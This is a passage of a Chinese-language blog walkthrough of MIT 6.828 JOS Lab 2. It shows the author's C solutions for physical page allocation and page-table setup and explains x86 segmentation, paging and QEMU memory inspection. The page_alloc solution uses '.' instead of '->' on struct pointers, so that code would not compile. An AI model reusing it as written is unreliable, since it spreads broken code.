分配的是虚拟内存，<strong>但是 pages 数组对应的是物理内存</strong>，因此这里别忘了进行转换（笔者就在这碰了坑）</p><p>注意以上这些标准之后，修改 <code>page_init()</code> 的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">page_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">// The example code here marks all physical pages as free.</span><br><span class="hljs-comment">// However this is not truly the case.  What memory is free?</span><br><span class="hljs-comment">//  1) Mark physical page 0 as in use.</span><br><span class="hljs-comment">//     This way we preserve the real-mode IDT and BIOS structures</span><br><span class="hljs-comment">//     in case we ever need them.  (Currently we don&#x27;t, but...)</span><br><span class="hljs-comment">//  2) The rest of base memory, [PGSIZE, npages_basemem * PGSIZE)</span><br><span class="hljs-comment">//     is free.</span><br><span class="hljs-comment">//  3) Then comes the IO hole [IOPHYSMEM, EXTPHYSMEM), which must</span><br><span class="hljs-comment">//     never be allocated.</span><br><span class="hljs-comment">//  4) Then extended memory [EXTPHYSMEM, ...).</span><br><span class="hljs-comment">//     Some of it is in use, some is free. Where is the kernel</span><br><span class="hljs-comment">//     in physical memory?  Which pages are already in use for</span><br><span class="hljs-comment">//     page tables and other data structures?</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Change the code to reflect this.</span><br><span class="hljs-comment">// NB: DO NOT actually touch the physical memory corresponding to</span><br><span class="hljs-comment">// free pages!</span><br><br><span class="hljs-comment">// 0) init</span><br><span class="hljs-type">size_t</span> i;<br><span class="hljs-type">size_t</span> next_free_addr;<br>page_free_list = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// 1) real-mode IDT and BIOS</span><br>pages[<span class="hljs-number">0</span>].pp_ref = <span class="hljs-number">1</span>;<br><br><span class="hljs-comment">// 2) [PGSIZE, npages_basemem * PGSIZE), all free</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; npages_basemem; i++) &#123;<br>pages[i].pp_ref = <span class="hljs-number">0</span>;<br>pages[i].pp_link = page_free_list;<br>page_free_list = &amp;pages[i];<br>&#125;<br><br><span class="hljs-comment">// 3) [IOPHYSMEM, EXTPHYSMEM), treat it as a hole</span><br><span class="hljs-keyword">for</span> (i = IOPHYSMEM/PGSIZE; i &lt; EXTPHYSMEM/PGSIZE; i++) &#123;<br>pages[i].pp_ref = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// 4) kernel image, page tables, other structure in user, others free</span><br>next_free_addr = (<span class="hljs-type">size_t</span>) PADDR(boot_alloc(<span class="hljs-number">0</span>));<br><span class="hljs-keyword">for</span> (i = EXTPHYSMEM/PGSIZE; i &lt; next_free_addr / PGSIZE; i++) &#123;<br>pages[i].pp_ref = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">for</span> (i = next_free_addr / PGSIZE; i &lt; npages; i++) &#123;<br>pages[i].pp_ref = <span class="hljs-number">0</span>;<br>pages[i].pp_link = page_free_list;<br>page_free_list = &amp;pages[i];<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="page-alloc-：分配单个空闲页面"><a href="#page-alloc-：分配单个空闲页面" class="headerlink" title="page_alloc()：分配单个空闲页面"></a>page_alloc()：分配单个空闲页面</h4><p>这一块比较简单，直接从 freelist 中取出一个页面即可，这里注意如果有 <code>ALLOC_ZERO</code> 则需要我们帮忙清零，<strong>而且我们分配时不应当增加引用计数，这应该是由 caller 完成的</strong></p><p>这里我们别忘了在清零时应当用 <code>page2kva</code> 将 PageInfo 结构体地址转化为其对应页面的虚拟地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Allocates a physical page.  If (alloc_flags &amp; ALLOC_ZERO), fills the entire</span><br><span class="hljs-comment">// returned physical page with &#x27;\0&#x27; bytes.  Does NOT increment the reference</span><br><span class="hljs-comment">// count of the page - the caller must do these if necessary (either explicitly</span><br><span class="hljs-comment">// or via page_insert).</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Be sure to set the pp_link field of the allocated page to NULL so</span><br><span class="hljs-comment">// page_free can check for double-free bugs.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Returns NULL if out of free memory.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: use page2kva and memset</span><br><span class="hljs-keyword">struct</span> PageInfo *<br><span class="hljs-title function_">page_alloc</span><span class="hljs-params">(<span class="hljs-type">int</span> alloc_flags)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">victim</span>;</span><br><br><span class="hljs-comment">// out of memory</span><br><span class="hljs-keyword">if</span> (!page_free_list)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// normal alloc</span><br>victim = page_free_list;<br>page_free_list = page_free_list.pp_link;<br>victim.pp_link = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_ZERO)<br><span class="hljs-built_in">memset</span>(page2kva(victim), <span class="hljs-number">0</span>, PGSIZE);<br><br><span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="page-free-：释放单个页面"><a href="#page-free-：释放单个页面" class="headerlink" title="page_free()：释放单个页面"></a>page_free()：释放单个页面</h4><p>主要是一些检查之后插入 freelist 头部即可，笔者还自行加了一个类似 ptmalloc 中对头部的简易 double free 检测（笑）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Return a page to the free list.</span><br><span class="hljs-comment">// (This function should only be called when pp-&gt;pp_ref reaches 0.)</span><br><span class="hljs-comment">//</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">page_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> PageInfo *pp)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><span class="hljs-comment">// Hint: You may want to panic if pp-&gt;pp_ref is nonzero or</span><br><span class="hljs-comment">// pp-&gt;pp_link is not NULL.</span><br><br><span class="hljs-comment">// check for double free at top</span><br><span class="hljs-keyword">if</span> (pp == page_free_list)<br>panic(<span class="hljs-string">&quot;double free detected (freelist top)&quot;</span>);<br><br><span class="hljs-comment">// check double free by pp_link</span><br><span class="hljs-keyword">if</span> (pp-&gt;pp_link)<br>panic(<span class="hljs-string">&quot;double free detected (pp_link)&quot;</span>);<br><br><span class="hljs-comment">// check validation by pp_ref</span><br><span class="hljs-keyword">if</span> (pp-&gt;pp_ref)<br>panic(<span class="hljs-string">&quot;cannot free a page in use!&quot;</span>);<br><br>pp-&gt;pp_link = page_free_list;<br>page_free_list = pp;<br>&#125;<br></code></pre></td></tr></table></figure><p>到这里 Exercise 1 就完成了，接下来进入 Part2.</p><h2 id="Part-2-Virtual-Memory"><a href="#Part-2-Virtual-Memory" class="headerlink" title="Part 2: Virtual Memory"></a>Part 2: Virtual Memory</h2><p>一上来就是 Exercise 2，主要是让我们了解 80386 下的<strong>分段</strong>和<strong>分页</strong></p><blockquote><p><strong>Exercise 2.</strong> Look at chapters 5 and 6 of the <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/toc.htm">Intel 80386 Reference Manual</a>, if you haven’t done so already. Read the sections about page translation and page-based protection closely (5.2 and 6.4). We recommend that you also skim the sections about segmentation; while JOS uses the paging hardware for virtual memory and protection, segment translation and segment-based protection cannot be disabled on the x86, so you will need a basic understanding of it.</p></blockquote><p>分段大家都懂，就是一个段寄存器里存放段选择子对应一个段描述符表示一块连续的内存称为一个segment，分页则是依托页表这一结构建立起虚拟地址到物理地址间的映射，那么是不是说明分页出现以后分段就自然而然地消失了呢？答案是否定的，<strong>分页与分段其实是同时存在的</strong>，因为这是由硬件（CPU）提供的功能</p><p>下图是一张分页与分段相结合的逻辑地址到物理地址间转换的过程</p><p><img src="https://s2.loli.net/2022/03/15/fYIXuTGWdMn7ViE.png" alt="image.png"></p><p>笔者这里参照其提供的文档简述一下分段+分页下的地址翻译</p><h4 id="Segment-Translation"><a href="#Segment-Translation" class="headerlink" title="Segment Translation"></a>Segment Translation</h4><p>进入保护模式之后，段寄存器并没有弃用，仍然承担着其“描述一个内存段”的作用，但仅有 16 位的、数量少得可怜的段寄存器早已无法满足人们的需求，因此在保护模式下段寄存器不再直接存放段的基址，而是存放着「段选择子」（segment selector）——真正的段描述符（segment descriptor）存放在一个名为「段描述符表」（segment descriptor table）的一块连续内存上，段选择子用以标识对应的段描述符在段描述符表中的下标与段的权限</p><p>因此在访问一个虚拟地址（逻辑地址）时首先需要通过段描述符翻译成对应的线性地址（若未开启分页则翻译的结果便直接为物理地址）</p><p><img src="https://s2.loli.net/2022/03/15/jhiSsfPoKgVyGdR.png" alt="image.png"></p><p>一个段描述符有着如下结构，需要注意的是<strong>系统段</strong>与普通的数据段和代码段等是有些许区别的，后者就是我们常用的普通的段，而前者通常用于表示中断门、陷阱门、调用门等</p><p><img src="https://s2.loli.net/2022/03/15/xhKpzoEHBXnVRk1.png" alt="image.png"></p><p>当然，既然段寄存器里存放的变成了段选择子，那么我们自然需要一个新的结构来对应表示段描述符表的地址，段描述符表分为两种——全局段描述符表与局部段描述符表，因而页引入了两个新的寄存器——GDTR 与 LDTR</p><p>需要注意的是，全局段描述符表的第一个段描述符为<strong>不可用的段描述符</strong></p><p><img src="https://s2.loli.net/2022/03/15/izYW8Dp7feT1wNE.png" alt="image.png"></p><p>最后我们来看段寄存器中存放的段选择子，结构较为简单，主要就是存放了对应的段描述符在段描述符表中的下标、访问权限、对应位于全局&#x2F;局部段描述符表</p><p><img src="https://s2.loli.net/2022/03/15/74PQFlKoHqLbsyW.png" alt="image.png"></p><blockquote><p>关于分段机制，更详细深入的说明参见 <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%89%E3%80%81%E5%85%A8%E5%B1%80%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%EF%BC%88Global-Descriptor-Table%EF%BC%89">https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%89%E3%80%81%E5%85%A8%E5%B1%80%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%EF%BC%88Global-Descriptor-Table%EF%BC%89</a></p></blockquote><h4 id="Page-Translation"><a href="#Page-Translation" class="headerlink" title="Page Translation"></a>Page Translation</h4><p>讲完了分段机制，接下来到分页机制，分页机制将物理内存以「页」为粒度进行管理，通过「页表」这一数据结构完成线性地址到物理地址之间的映射</p><p>在保护模式下，是否开启分页是通过 Cr0 寄存器的 PG 位标识的，<strong>但是分段是默认开启的</strong>，怎么处理分段与分页之间的冲突呢？笔者认为可以这么理解：<strong>在开启分页之前，分段是直接对物理地址空间进行分段；在开启分页之后，分段是对页表映射后的线性地址空间进行分段</strong>，相当于是在分段与物理地址之间插入了一个中间层</p><p>于是我们接下来来看 32 位下启用二级页表的分页机制，在分页机制下一个 32 位的线性地址有着这样的三段式结构：</p><p><img src="https://s2.loli.net/2022/03/15/3pScjrUCxOkwJA7.png" alt="image.png"></p><p>在 Cr3 寄存器中存放着页目录表的地址；MMU在将一个线性地址翻译成物理地址时，首先通过 Cr3 寄存器获取到页目录表地址，通过线性地址的 DIR 域找到页目录表对应下标的页目录表项（Page Directory Entry），页目录表项中存放着对应的页表的地址，再通过线性地址的 PAGE 域找到页表对应下标的页表项（Page Table Entry），页表项中存放着对应的物理页地址，最后通过 OFFSET 域（即页内偏移）访问到对应物理页的对应数据</p><p><img src="https://s2.loli.net/2022/03/15/bnYKURW1xPg7CHN.png" alt="image.png"></p><p>一个页（目录）表项有着如下的结构，由于页目录表、页表、物理页都是以页为单位对齐的，因此我们只需要存放以页为单位的地址即可，空闲下来的这些位被用以存放页访问、读写权限等</p><p><img src="https://s2.loli.net/2022/03/15/begX4uJNymUs92a.png" alt="image.png"></p><h3 id="Virtual-Linear-and-Physical-Addresses"><a href="#Virtual-Linear-and-Physical-Addresses" class="headerlink" title="Virtual, Linear, and Physical Addresses"></a>Virtual, Linear, and Physical Addresses</h3><p>我们现在正式对一堆各种地址名词下定义：</p><ul><li>「虚拟地址」：基于分段机制表示的地址，由一个段选择子与段内偏移组成</li><li>「线性地址」：基于分页机制表示的地址，是经过了分段翻译后的一个地址</li><li>「物理地址」：RAM 上的真实地址</li></ul><p>得到如下转换图例：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">           Selector  +--------------+         +-----------+<br>          ----------&gt;|<span class="hljs-string">              </span>|<span class="hljs-string">         </span>|<span class="hljs-string">           </span>|<br>                     |<span class="hljs-string"> Segmentation </span>|<span class="hljs-string">         </span>|<span class="hljs-string">  Paging   </span>|<br>Software             |<span class="hljs-string">              </span>|<span class="hljs-string">--------&gt;</span>|<span class="hljs-string">           </span>|<span class="hljs-string">----------&gt;  RAM</span><br><span class="hljs-string">            Offset   </span>|<span class="hljs-string">  Mechanism   </span>|<span class="hljs-string">         </span>|<span class="hljs-string"> Mechanism </span>|<br>          ----------&gt;|<span class="hljs-string">              </span>|<span class="hljs-string">         </span>|<span class="hljs-string">           </span>|<br>                     +--------------+         +-----------+<br>            Virtual                   Linear                Physical<br></code></pre></td></tr></table></figure><p>其实在分页机制出现之后，分段机制就没有什么存在的意义了，因此你可以看到现代操作系统基本上都很少提分段的概念，大部分情况下虚拟地址就直接是线性地址（当然，其实还是有一些地方用到分段的权限验证等特性的）</p><p>同样地，为了简化地址翻译的操作，在 <code>boot/boot.S</code> 中 JOS <strong>初始化了一个所有的段描述符都对应段基址 0、段界限 0xffffffff 的全局段描述符表</strong>，这样虚拟地址实际上就直接是线性地址了</p><p>下面来看 Exercise 3，主要让我们熟悉 Qemu 提供的一些查看内存的指令</p><blockquote><p><strong>Exercise 3.</strong> While GDB can only access QEMU’s memory by virtual address, it’s often useful to be able to inspect physical memory while setting up virtual memory. Review the QEMU <a href="https://pdos.csail.mit.edu/6.828/2018/labguide.html#qemu">monitor commands</a> from the lab tools guide, especially the <code>xp</code> command, which lets you inspect physical memory. To access the QEMU monitor, press Ctrl-a c in the terminal (the same binding returns to the serial console).</p><p>Use the xp command in the QEMU monitor and the x command in GDB to inspect memory at corresponding physical and virtual addresses and make sure you see the same data.</p><p>Our patched version of QEMU provides an info pg command that may also prove useful: it shows a compact but detailed representation of the current page tables, including all mapped memory ranges, permissions, and flags. Stock QEMU also provides an info mem command that shows an overview of which ranges of virtual addresses are mapped and with what permissions.</p></blockquote><p>先按 <code>Ctrl + A</code>，然后再按 <code>C</code>，进入 Qemu 的 monitor 模式，使用 <code>info pg</code> 指令查看分页映射，如下：</p><p><img src="https://s2.loli.net/2022/03/15/FlrKz6RbmSIBQf4.png" alt="image.png"></p><p>使用 <code>xp</code> 命令查看对应物理内存上数据与两个映射的虚拟地址上数据，完全一致</p><p><img src="https://s2.loli.net/2022/03/15/hupwIHRkyqefoD3.png" alt="image.png"></p><p>最后是 <code>info mem</code> 查看地址空间权限，虚拟地址空间起始 4MB 仅为可读权限，位于虚拟地址高 256MB 的起始 4MB 为可读写权限，<strong>但实际上对应的都是同一块物理地址空间</strong></p><p><img src="https://s2.loli.net/2022/03/15/N8nMTkh6Pgqlj5m.png" alt="image.png"></p><p>继续往下，在 JOS 中定义了两个 <code>uint32_t</code> 的别名 <code>uintptr_t</code> 与 <code>physaddr_t</code> 表示虚拟地址与物理地址（在编译器看来其实没有什么区别）</p><table><thead><tr><th>C type</th><th>Address type</th></tr></thead><tbody><tr><td><code>T*</code></td><td>Virtual</td></tr><tr><td><code>uintptr_t</code></td><td>Virtual</td></tr><tr><td><code>physaddr_t</code></td><td>Physical</td></tr></tbody></table><p>接下来是 MIT 6.828 的一个小习题：</p><blockquote><p><strong>Question</strong></p><ol><li>Assuming that the following JOS kernel code is correct, what type should variable <code>x</code> have, <code>uintptr_t</code> or <code>physaddr_t</code>?</li></ol><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">mystery_t x<span class="hljs-comment">;</span><br>char* value <span class="hljs-operator">=</span> return_a_pointer()<span class="hljs-comment">;</span><br>*value <span class="hljs-operator">=</span> <span class="hljs-number">10</span><span class="hljs-comment">;</span><br><span class="hljs-attribute">x</span> <span class="hljs-operator">=</span> (mystery_t) value<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></blockquote><p>我们知道虚拟地址是可以通过 MMU 进行翻译访问到物理地址的，但是一个物理地址经过 MMU 之后得到的可能是奇形怪状的东西（比如说物理地址同值的虚拟地址已经建立了一个映射），所以这里的 x 应当是 <code>uintptr_t</code> 类型</p><h3 id="Reference-counting"><a href="#Reference-counting" class="headerlink" title="Reference counting"></a>Reference counting</h3><p>在用以表示单个物理页框的 <code>PageInfo</code> 结构体中的成员 <code>pp_ref</code> 用以表示一张页面被引用的次数（引用计数），引用计数为 0 时表示该页为空闲页，但是引用计数的增&#x2F;减<strong>应当由使用者完成</strong>，因此在我们调用 <code>page_alloc()</code> 之后应当立即将引用计数 + 1，而当引用计数为 0 时我们才应当调用 <code>page_free()</code> 释放一张内存页</p><blockquote><p>最后这个工作 JOS 归并在 <code>page_decref()</code> 中完成</p></blockquote><h3 id="Page-Table-Management"><a href="#Page-Table-Management" class="headerlink" title="Page Table Management"></a>Page Table Management</h3><p>接下来是 Exercise4，让我们完成对页表的管理，补全对应函数</p><blockquote><p><strong>Exercise 4.</strong> In the file <code>kern/pmap.c</code>, you must implement code for the following functions.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">pgdir_walk</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">boot_map_region</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">page_lookup</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">page_remove</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">page_insert</span><span class="hljs-params">()</span></span><br><br></code></pre></td></tr></table></figure><p><code>check_page()</code>, called from <code>mem_init()</code>, tests your page table management routines. You should make sure it reports success before proceeding.</p></blockquote><h4 id="pgdir-walk-：（创建并）返回-PTE"><a href="#pgdir-walk-：（创建并）返回-PTE" class="headerlink" title="pgdir_walk()：（创建并）返回 PTE"></a>pgdir_walk()：（创建并）返回 PTE</h4><p>按惯例先看注释，对于一个给定的页目录表地址与一个线性地址，该函数应当返回对应的「页表项」的地址，若对应的页表为空且指定了 <code>create</code> 标志位，则分配一张新的物理页作为新的页表，若否、或是分配物理页失败则直接返回 NULL；分配成功后应当增加该页的引用计数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Given &#x27;pgdir&#x27;, a pointer to a page directory, pgdir_walk returns</span><br><span class="hljs-comment">// a pointer to the page table entry (PTE) for linear address &#x27;va&#x27;.</span><br><span class="hljs-comment">// This requires walking the two-level page table structure.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// The relevant page table page might not exist yet.</span><br><span class="hljs-comment">// If this is true, and create == false, then pgdir_walk returns NULL.</span><br><span class="hljs-comment">// Otherwise, pgdir_walk allocates a new page table page with page_alloc.</span><br><span class="hljs-comment">//    - If the allocation fails, pgdir_walk returns NULL.</span><br><span class="hljs-comment">//    - Otherwise, the new page&#x27;s reference count is incremented,</span><br><span class="hljs-comment">//the page is cleared,</span><br><span class="hljs-comment">//and pgdir_walk returns a pointer into the new page table page.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint 1: you can turn a PageInfo * into the physical address of the</span><br><span class="hljs-comment">// page it refers to with page2pa() from kern/pmap.h.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint 2: the x86 MMU checks permission bits in both the page directory</span><br><span class="hljs-comment">// and the page table, so it&#x27;s safe to leave permissions in the page</span><br><span class="hljs-comment">// directory more permissive than strictly necessary.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint 3: look at inc/mmu.h for useful macros that manipulate page</span><br><span class="hljs-comment">// table and page directory entries.</span><br><span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p>参照源码其他地方的相关写法，利用 JOS 提供的一些宏很容易就能补完该函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">pte_t</span> *<br><span class="hljs-title function_">pgdir_walk</span><span class="hljs-params">(<span class="hljs-type">pde_t</span> *pgdir, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *va, <span class="hljs-type">int</span> create)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><br><span class="hljs-type">int</span> pde_idx;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">new_page_table_page</span>;</span><br><span class="hljs-type">pte_t</span> *page_table;<br><br><span class="hljs-keyword">if</span> (!pgdir)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// create page table if not exist</span><br>pde_idx = PDX(va);<br><span class="hljs-keyword">if</span> (!pgdir[pde_idx] || !(pgdir[pde_idx] &amp; PTE_P))<br>&#123;<br><span class="hljs-keyword">if</span> (create)<br>&#123;<br>new_page_table_page = page_alloc(ALLOC_ZERO);<br><span class="hljs-keyword">if</span> (!new_page_table_page)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>new_page_table_page-&gt;pp_ref++;<br>pgdir[pde_idx] = (<span class="hljs-type">pde_t</span>) (page2pa(new_page_table_page) | PTE_P | PTE_W | PTE_U);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// align to PGSIZE</span><br>page_table = (<span class="hljs-type">pte_t</span>*) ((<span class="hljs-type">uint32_t</span>) KADDR(pgdir[pde_idx]) &amp; (~(PGSIZE - <span class="hljs-number">1</span>)));<br><br><span class="hljs-keyword">return</span> &amp;page_table[PTX(va)];<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="boot-map-region-：建立虚拟地址区域到物理地址区域映射"><a href="#boot-map-region-：建立虚拟地址区域到物理地址区域映射" class="headerlink" title="boot_map_region()：建立虚拟地址区域到物理地址区域映射"></a>boot_map_region()：建立虚拟地址区域到物理地址区域映射</h4><p>惯例先看注释，主要是建立虚拟地址 <code>[va, va+size)</code> 到物理地址 <code>[pa, pa+size)</code> 之间的映射，提示我们使用 <code>pgdir_walk()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Map [va, va+size) of virtual address space to physical [pa, pa+size)</span><br><span class="hljs-comment">// in the page table rooted at pgdir.  Size is a multiple of PGSIZE, and</span><br><span class="hljs-comment">// va and pa are both page-aligned.</span><br><span class="hljs-comment">// Use permission bits perm|PTE_P for the entries.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// This function is only intended to set up the ``static&#x27;&#x27; mappings</span><br><span class="hljs-comment">// above UTOP. As such, it should *not* change the pp_ref field on the</span><br><span class="hljs-comment">// mapped pages.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Hint: the TA solution uses pgdir_walk</span><br></code></pre></td></tr></table></figure><p>对应写入页表项条目即可，注意这里不需要改变页的引用计数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">boot_map_region</span><span class="hljs-params">(<span class="hljs-type">pde_t</span> *pgdir, <span class="hljs-type">uintptr_t</span> va, <span class="hljs-type">size_t</span> size, <span class="hljs-type">physaddr_t</span> pa, <span class="hljs-type">int</span> perm)</span><br>&#123;<br><span class="hljs-comment">// Fill this function in</span><br><br><span class="hljs-type">size_t</span> i;<br><span class="hljs-type">pte_t</span> *cur_pte;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; size / PGSIZE; i++)<br>&#123;<br>cur_pte = pgdir_walk(pgdir, (<span class="hljs-type">void</span> *)(va + i * PGSIZE), <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!cur_pte)<br>panic(<span class="hljs-string">&quot;out of memory while creating page table!&quot;</span>);<br>*cur_pte = (<span class="hljs-type">pte_t</span>) ((pa + i * PGSIZE) | PTE_P | perm);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="page-lookup-：返回虚拟地址对应-PageInfo-地址"><a 